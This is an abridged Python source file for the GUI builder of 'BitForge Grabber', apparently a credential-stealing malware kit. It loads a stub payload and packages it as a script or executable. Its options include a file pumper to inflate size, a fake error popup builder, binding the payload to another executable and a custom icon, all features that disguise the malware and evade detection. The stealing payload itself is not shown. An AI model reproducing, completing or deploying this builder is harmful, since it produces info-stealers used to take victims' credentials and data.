...
class Utility:
    ...
    def CheckForUpdates() -> bool:
        if Settings.UpdatesCheck:
            ...
            hashFilePath = os.path.join(os.path.dirname(__file__), "needed_1", "hash")
            if os.path.isfile(hashFilePath):
                ...
                try:
                    ...
                    newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/dim1z35/BitForge/refs/heads/main/needed_1/hash", timeout= 5).data.decode())["hash"]
...
class BuilderOptionsFrame(ctk.CTkFrame):
    ...
    def buildModeButtonControl_Callback(self) -> None:
        ...
        if self.OutputAsExe: 
            ...
            if self.iconBytes:
                self.selectIconButtonControl_Callback()
            
            if self.boundExePath:
                self.bindExeButtonControl_Callback()
    ...
    def pumpStub_Event(self) -> None:
        if not self.pumpStubVar.get():
            ...
            self.pumpLimit = pumperSettings.limit * 1024 * 1024

class PumperSettings(ctk.CTkToplevel):

    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("BitForge Grabber [File Pumper]")
        self.after(200, lambda: self.iconbitmap(os.path.join("needed_1", "icon.ico")))
        self.grab_set()
...
class FakeErrorBuilder(ctk.CTkToplevel):
    ...
    def __init__(self, master) -> None:
        super().__init__(master)
        self.title("BitForge Grabber [Fake Error Builder]")
        self.after(200, lambda: self.iconbitmap(os.path.join("needed_1", "icon.ico")))
        self.grab_set()
...
class Builder(ctk.CTk):
    ...
    def __init__(self) -> None:
        ...
        self.title("BitForge Grabber [Builder]")
        self.iconbitmap(os.path.join("needed_1", "icon.ico"))
    ...
    def BuildPythonFile(self, config: str) -> None:
        ...
        with open(os.path.join(os.path.dirname(__file__), "needed_2", "stub.py")) as file:
            code = file.read()
        
        sys.path.append(os.path.join(os.path.dirname(__file__), "needed_2"))

        if os.path.isdir(os.path.join(os.path.dirname(__file__), "needed_2", "__pycache__")):
            try:
                shutil.rmtree(os.path.join(os.path.dirname(__file__), "needed_2", "__pycache__"))
            except Exception:
                pass
        from needed_2 import process
    ...
    def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
        ...
        for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "needed_2")):
...
if __name__ == "__main__":
    ...
    if os.name == "nt":
        if not os.path.isdir(os.path.join(os.path.dirname(__file__), "needed_2")):
            subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'needed_2 folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', 
                            shell=True, 
        ...
        if Utility.CheckForUpdates():
            ...
            if response:
                webbrowser.open_new_tab("https://github.com/dim1z35/BitForge")
                exit(0)
